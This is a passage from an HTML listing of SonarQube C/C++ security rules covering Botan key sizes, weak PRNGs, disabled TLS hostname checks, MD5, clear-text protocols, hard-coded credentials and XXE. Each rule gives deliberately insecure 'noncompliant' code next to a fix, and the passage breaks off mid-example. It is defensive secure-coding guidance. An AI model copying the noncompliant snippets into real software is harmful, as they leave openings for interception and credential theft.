<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/pubkey.h&gt;
#include &lt;botan/rng.h&gt;
#include &lt;botan/rsa.h&gt;

void encrypt() {
    std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::System_RNG);
    Botan::RSA_PrivateKey                           rsaKey(*rng, 1024); // Noncompliant
}
</pre>
<p>Here is an example with the generation of a key as part of a Discrete Logarithmic (DL) group, a Digital Signature Algorithm (DSA) parameter:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
#include &lt;botan/dl_group.h&gt;

void encrypt() {
    Botan::DL_Group("dsa/botan/1024"); // Noncompliant
}
</pre>
<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the elliptic curve
name:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
#include &lt;botan/ec_group.h&gt;

void encrypt() {
    Botan::EC_Group("secp160k1"); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/pubkey.h&gt;
#include &lt;botan/rng.h&gt;
#include &lt;botan/rsa.h&gt;

void encrypt() {
    std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::System_RNG);
    Botan::RSA_PrivateKey                           rsaKey(*rng, 2048);
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
#include &lt;botan/dl_group.h&gt;

void encrypt() {
    Botan::DL_Group("dsa/botan/2048");
}
</pre>
<pre data-diff-id="3" data-diff-type="compliant">
#include &lt;botan/ec_group.h&gt;

void encrypt() {
    Botan::EC_Group("secp224k1");
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptography community.</p>
<p>The appropriate choices are the following.</p>
<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>
<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>
<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both. It provides 112 bits of security. A key length of
<strong>3072</strong> or <strong>4092</strong> should be preferred when possible.</p>
<h4>AES (Advanced Encryption Standard)</h4>
<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying
all possible keys.<br> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.
Therefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>
<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>
<h4>Elliptic Curve Cryptography (ECC)</h4>
<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve
algorithms is mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>
<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC-based algorithms.</p>
<p>Additionally, some curves that theoretically provide sufficiently long keys are still discouraged. This can be because of a flaw in the curve
parameters, a bad overall design, or poor performance. It is generally advised to use a NIST-approved elliptic curve wherever possible. Such curves
currently include:</p>
<ul>
  <li> NIST P curves with a size of at least 224 bits, e.g. secp256r1. </li>
  <li> Curve25519, generally known as ed25519 or x25519 depending on its application. </li>
  <li> Curve448. </li>
  <li> Brainpool curves with a size of at least 224 bits, e.g. brainpoolP224r1 </li>
</ul>
<h3>Going the extra mile</h3>
<h4>Pre-Quantum Cryptography</h4>
<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br> It is important to keep
in mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or
"post-quantum") counterpart.</p>
<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>
<p><a href="https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation">Learn more here</a>.</p>
<h2>Resources</h2>
<ul>
  <li> Documentation
    <ul>
      <li> NIST Documentation - <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-186.pdf">NIST SP 800-186: Recommendations
      for Discrete Logarithm-based Cryptography: Elliptic Curve Domain Parameters</a> </li>
      <li> IETF - <a href="https://datatracker.ietf.org/doc/html/rfc5639">rfc5639: Elliptic Curve Cryptography (ECC) Brainpool Standard Curves and
      Curve Generation</a> </li>
    </ul>  </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf">NIST 800-131A</a> - Recommendation for Transitioning the
  Use of Cryptographic Algorithms and Key Lengths </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S2245">
              c:S2245
            </a>
          </td>
          <td>
            <details>
              <p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386">CVE-2013-6386</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419">CVE-2006-3419</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102">CVE-2008-4102</a> </li>
</ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the functions rely on a pseudorandom number generator, they should not be used for security-critical applications or for protecting sensitive
data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li>
  <li> the function you use generates a value which can be predicted (pseudo-random). </li>
  <li> the generated value is used multiple times. </li>
  <li> an attacker can access the generated value. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use functions which rely on a strong random number generator such as <code>randombytes_uniform()</code> or <code>randombytes_buf()</code> from
  <code>libsodium</code>, or <code>randomize()</code> from Botan. </li>
  <li> Use the generated random values only once. </li>
  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
#include &lt;random&gt;
// ...

void f() {
  int random_int = std::rand(); // Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;sodium.h&gt;
#include &lt;botan/system_rng.h&gt;
// ...

void f() {
  char random_chars[10];
  randombytes_buf(random_chars, 10); // Compliant
  uint32_t random_int = randombytes_uniform(10); // Compliant

  uint8_t random_chars[10];
  Botan::System_RNG system;
  system.randomize(random_chars, 10); // Compliant
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/338">CWE-338 - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/330">CWE-330 - Use of Insufficiently Random Values</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1241">CWE-1241 - Use of Predictable Algorithm in Random Number Generator</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/UNcxBQ">CERT, MSC30-C.</a> - Do not use the rand() function for generating pseudorandom numbers
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/2ns-BQ">CERT, MSC50-CPP.</a> - Do not use std::rand() for generating pseudorandom numbers </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM">Predictable Pseudo Random Number
  Generator</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5527">
              c:S5527
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows attackers to impersonate a trusted host.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this
process, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding
an extra layer of trust and security.</p>
<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity
and intercept, manipulate, or steal the data being transmitted.</p>
<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the
application code would still accept it.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build
this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit
this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s server,
tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data
your system sends to them, potentially leading to significant data breaches.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled hostname validation.</p>
<p>The hostname validation gets disabled by overriding <code>tls_verify_cert_chain</code> with an empty implementation. It is highly recommended to
use the original implementation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/tls_client.h&gt;
#include &lt;botan/tls_callbacks.h&gt;
#include &lt;botan/tls_session_manager.h&gt;
#include &lt;botan/tls_policy.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/certstor.h&gt;
#include &lt;botan/certstor_system.h&gt;

class Callbacks : public Botan::TLS::Callbacks
{
    virtual void tls_verify_cert_chain(
              const std::vector&lt;Botan::X509_Certificate&gt; &amp;cert_chain,
              const std::vector&lt;std::shared_ptr&lt;const Botan::OCSP::Response&gt;&gt; &amp;ocsp_responses,
              const std::vector&lt;Botan::Certificate_Store *&gt; &amp;trusted_roots,
              Botan::Usage_Type usage,
              const std::string &amp;hostname,
              const Botan::TLS::Policy &amp;policy)
    override  { }
};

class Client_Credentials : public Botan::Credentials_Manager { };

void connect() {
    Callbacks callbacks;
    Botan::AutoSeeded_RNG rng;
    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);
    Client_Credentials creds;
    Botan::TLS::Strict_Policy policy;

    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,
                              Botan::TLS::Server_Information("example.com", 443),
                              Botan::TLS::Protocol_Version::TLS_V12); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/tls_client.h&gt;
#include &lt;botan/tls_callbacks.h&gt;
#include &lt;botan/tls_session_manager.h&gt;
#include &lt;botan/tls_policy.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/certstor.h&gt;
#include &lt;botan/certstor_system.h&gt;

class Callbacks : public Botan::TLS::Callbacks { };

class Client_Credentials : public Botan::Credentials_Manager { };

void connect() {
    Callbacks callbacks;
    Botan::AutoSeeded_RNG rng;
    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);
    Client_Credentials creds;
    Botan::TLS::Strict_Policy policy;

    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,
                              Botan::TLS::Server_Information("example.com", 443),
                              Botan::TLS::Protocol_Version::TLS_V12);
}
</pre>
<h3>How does this work?</h3>
<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root
cause: the validity of the certificate.</p>
<h4>Use valid certificates</h4>
<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one system’s code should not work around
another system’s problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>
<p>Therefore, the first solution is to change the remote host’s certificate to match its identity. If the remote host is not under your control,
consider replicating its service to a server whose certificate you can change yourself.</p>
<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>
<ul>
  <li> Create a self-signed certificate for that machine. </li>
  <li> Add this self-signed certificate to the system’s trust store. </li>
  <li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li>
</ul>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://botan.randombit.net/handbook/">Botan</a> - Handbook </li>
  <li> <a href="https://www.feistyduck.com/books/openssl-cookbook/">OpenSSL</a> - Cookbook </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/297">CWE-297 - Improper Validation of Certificate with Host Mismatch</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S4790">
              c:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul>
  <li> User-password storage. </li>
  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>
  <li> To compute some message integrity. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too "quickly", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
#include &lt;botan/hash.h&gt;
// ...

Botan::secure_vector&lt;uint8_t&gt; f(std::string input){
    std::unique_ptr&lt;Botan::HashFunction&gt; hash(Botan::HashFunction::create("MD5")); // Sensitive
    return hash-&gt;process(input);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;botan/hash.h&gt;
// ...

Botan::secure_vector&lt;uint8_t&gt; f(std::string input){
    std::unique_ptr&lt;Botan::HashFunction&gt; hash(Botan::HashFunction::create("SHA-512")); // Compliant
    return hash-&gt;process(input);
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1240">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5332">
              c:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul>
  <li> sensitive data exposure </li>
  <li> traffic redirected to a malicious endpoint </li>
  <li> malware-infected software update or installer </li>
  <li> execution of client-side code </li>
  <li> corruption of critical information </li>
</ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul>
  <li> bypassing isolation mechanisms </li>
  <li> compromising a component of the network </li>
  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>
</ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a
href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169">CVE-2019-6169</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327">CVE-2019-12327</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065">CVE-2019-11065</a> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>
  <li> Application data transits over an untrusted network. </li>
  <li> Compliance rules require the service to encrypt data in transit. </li>
  <li> Your application renders web pages with a relaxed mixed content policy. </li>
  <li> OS-level protections against clear-text traffic are deactivated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul>
      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>
      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>
      <li> Use <code>https</code> instead of <code>http</code>. </li>
      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>
    </ul>  </li>
  <li> Enable encryption of cloud components communications whenever it is possible. </li>
  <li> Configure your application to block mixed content when rendering web pages. </li>
  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>
</ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<pre>
char* http_url = "http://example.com"; // Sensitive
char* ftp_url = "ftp://anonymous@example.com"; // Sensitive
char* telnet_url = "telnet://anonymous@example.com"; // Sensitive
</pre>
<pre>
#include &lt;curl/curl.h&gt;

CURL *curl_ftp = curl_easy_init();
curl_easy_setopt(curl_ftp, CURLOPT_URL, "ftp://example.com/"); // Sensitive

CURL *curl_smtp = curl_easy_init();
curl_easy_setopt(curl_smtp, CURLOPT_URL, "smtp://example.com:587"); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
char* https_url = "https://example.com";
char* sftp_url = "sftp://anonymous@example.com";
char* ssh_url = "ssh://anonymous@example.com";
</pre>
<pre>
#include &lt;curl/curl.h&gt;

CURL *curl_ftps = curl_easy_init();
curl_easy_setopt(curl_ftps, CURLOPT_URL, "ftp://example.com/");
curl_easy_setopt(curl_ftps, CURLOPT_USE_SSL, CURLUSESSL_ALL); // FTP transport is done over TLS

CURL *curl_smtp_tls = curl_easy_init();
curl_easy_setopt(curl_smtp_tls, CURLOPT_URL, "smtp://example.com:587");
curl_easy_setopt(curl_smtp_tls, CURLOPT_USE_SSL, CURLUSESSL_ALL); // SMTP with STARTTLS
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data Exposure
  </a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/319">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>
  <li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html">Google, Moving towards more secure web</a> </li>
  <li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/">Mozilla, Deprecating non secure http</a> </li>
  <li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li>
  <li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html">AWS
  Documentation</a> - Stream Encryption </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S2068">
              c:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466">CVE-2019-13466</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389">CVE-2018-15389</a> </li>
</ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule looks for hard-coded credentials in variable names that match any of the patterns from the provided list.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>
  <li> Credentials are used in production environments. </li>
  <li> Application re-distribution is required before updating the credentials. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>
  <li> Store the credentials in a database. </li>
  <li> Use your cloud provider’s service for managing secrets. </li>
  <li> If a password has been disclosed through the source code: change it. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
dbi_conn conn = dbi_conn_new("mysql");
string password = "secret"; // Sensitive
dbi_conn_set_option(conn, "password", password.c_str());
</pre>
<h2>Compliant Solution</h2>
<pre>
dbi_conn conn = dbi_conn_new("mysql");
string password = getDatabasePassword(); // Compliant
dbi_conn_set_option(conn, "password", password.c_str()); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S2755">
              c:S2755
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows the usage of external entities in XML.</p>
<h2>Why is this an issue?</h2>
<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without
proper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>
<h3>What is the potential impact?</h3>
<h4>Exposing sensitive data</h4>
<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can
reference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these
entities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe
threat to the confidentiality of critical information.</p>
<h4>Exhausting system resources</h4>
<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,
attackers can construct XML payloads that cause resource exhaustion. This can overwhelm the system’s memory, CPU, or other critical resources, leading
to system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>
<h4>Forging requests</h4>
<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker
can make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as
retrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,
including unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>
<h2>How to fix it in Xerces</h2>
<h3>Code examples</h3>
<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE
attacks if an attacker can control the XML file that is processed.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
#include "xercesc/parsers/XercesDOMParser.hpp"

void parse() {
  XercesDOMParser *DOMparser = new XercesDOMParser();
